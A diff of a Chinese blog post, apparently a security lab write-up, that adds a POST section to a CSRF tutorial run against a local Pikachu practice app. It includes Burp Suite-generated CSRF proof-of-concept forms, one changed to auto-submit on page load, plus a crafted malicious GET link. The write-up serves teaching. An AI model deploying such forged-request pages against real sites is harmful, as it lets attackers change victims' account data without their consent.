@@ -114,7 +114,13 @@
 <meta property="og:image" content="http://yoursite.com/images/CSRF/1-2.png">
 <meta property="og:image" content="http://yoursite.com/images/CSRF/1-3.png">
 <meta property="og:image" content="http://yoursite.com/images/CSRF/1-4.png">
-<meta property="og:updated_time" content="2019-09-02T15:35:28.248Z">
+<meta property="og:image" content="http://yoursite.com/images/CSRF/2-0.png">
+<meta property="og:image" content="http://yoursite.com/images/CSRF/2-1.png">
+<meta property="og:image" content="http://yoursite.com/images/CSRF/2-2.png">
+<meta property="og:image" content="http://yoursite.com/images/CSRF/2-3.png">
+<meta property="og:image" content="http://yoursite.com/images/CSRF/2-4.png">
+<meta property="og:image" content="http://yoursite.com/images/CSRF/2-5.png">
+<meta property="og:updated_time" content="2019-09-03T12:00:08.130Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CSRF跨站请求伪造">
 <meta name="twitter:description" content="CSRF(跨站请求伪造)概述Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没">
@@ -411,7 +417,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-09-02 23:35:28" itemprop="dateModified" datetime="2019-09-02T23:35:28+08:00">2019-09-02</time>
+                <time title="修改时间：2019-09-03 20:00:08" itemprop="dateModified" datetime="2019-09-03T20:00:08+08:00">2019-09-03</time>
               </span>
             
           
@@ -490,14 +496,20 @@
 <li>攻击者必须了解 Web APP 请求的参数构造</li>
 <li>诱使用户触发攻击的指令（社工）</li>
 </ul>
-<h2 id="CSRF实验示例-GET-："><a href="#CSRF实验示例-GET-：" class="headerlink" title="CSRF实验示例(GET)："></a>CSRF实验示例(GET)：</h2><p>用户密码点击提示获取<br><img src="/images/CSRF/1-1.png" alt><br>用户登陆后可修改个人信息<br><img src="/images/CSRF/1-2.png" alt><br>使用BurpSuite截断修改用户向服务器发送的个人信息修改请求报文<br><img src="/images/CSRF/1-3.png" alt></p>
+<h2 id="CSRF实验示例-GET-："><a href="#CSRF实验示例-GET-：" class="headerlink" title="CSRF实验示例(GET)："></a>CSRF实验示例(GET)：</h2><p>用户密码点击提示获取<br><img src="/images/CSRF/1-1.png" alt><br>用户登陆后可修改个人信息<br><img src="/images/CSRF/1-2.png" alt><br>使用BurpSuite截断并修改用户向服务器发送的个人信息修改请求报文<br><img src="/images/CSRF/1-3.png" alt></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /pika/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=15988767673&amp;add=nba+lakes&amp;email=kobe%40pikachu.com&amp;submit=submit HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: http://127.0.0.1/pika/vul/csrf/csrfget/csrf_get_edit.php</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: UM_distinctid=16cd0f427f09-00c483a3070673-4c312272-1fa400-16cd0f427f14a9; CNZZDATA1254690350=674210068-1566873758-%7C1566873758; PHPSESSID=eg8t1vjk35vdi8bpg0n0s7ik87</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
 
 <p>制定恶意变更手机信息链接:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1//pika/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=12345678901&amp;add=nba+lakes&amp;email=kobe%40pikachu.com&amp;submit=submit</span><br></pre></td></tr></table></figure>
 
 <p>模拟用户访问钓鱼网站查看效果：<br><img src="/images/CSRF/1-4.png" alt></p>
-<h2 id="CSRF实验示例-POST-："><a href="#CSRF实验示例-POST-：" class="headerlink" title="CSRF实验示例(POST)："></a>CSRF实验示例(POST)：</h2>
+<h2 id="CSRF实验示例-POST-："><a href="#CSRF实验示例-POST-：" class="headerlink" title="CSRF实验示例(POST)："></a>CSRF实验示例(POST)：</h2><p>修改个人信息<br><img src="/images/CSRF/2-0.png" alt><br>使用BurpSuite截断并修改用户向服务器发送的个人信息修改请求报文<br><img src="/images/CSRF/2-1.png" alt><br>使用BurpSuite生成CSRF Poc<br><img src="/images/CSRF/2-2.png" alt><br><img src="/images/CSRF/2-3.png" alt></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>history.pushState('', '', '/')<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/pika/vul/csrf/csrfpost/csrf_post_edit.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"boy"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"phonenum"</span> <span class="attr">value</span>=<span class="string">"999999999999"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"add"</span> <span class="attr">value</span>=<span class="string">"nba&amp;#32;lakes"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">"kobe&amp;#64;pikachu&amp;#46;com"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用Poc 搭建站点，诱使用户访问网站并点击按钮<br><img src="/images/CSRF/2-4.png" alt></p>
+<p>模拟用户访问钓鱼网站查看效果：<br><img src="/images/CSRF/2-5.png" alt></p>
+<p>改进HTML代码，使用户访问网站时，自动使用POST提交表单信息</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>window.onload=function()&#123;</span><br><span class="line">    document.getElementById("submit").click();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>history.pushState('', '', '/')<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/pika/vul/csrf/csrfpost/csrf_post_edit.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"boy"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"phonenum"</span> <span class="attr">value</span>=<span class="string">"999999999999"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"add"</span> <span class="attr">value</span>=<span class="string">"nba&amp;#32;lakes"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">"kobe&amp;#64;pikachu&amp;#46;com"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"submit"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
       
     </div>
 
@@ -541,8 +553,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/9102/01/01/top/" rel="prev" title="置顶">
-                置顶 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/09/10/MySQL数据库基础/" rel="prev" title="MySQL数据库基础">
+                MySQL数据库基础 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -613,7 +625,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">18</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -650,7 +662,9 @@
         
           
         
-        <span class="site-state-item-count">10</span>
+          
+        
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">分类</span>
         </a>
       </div>
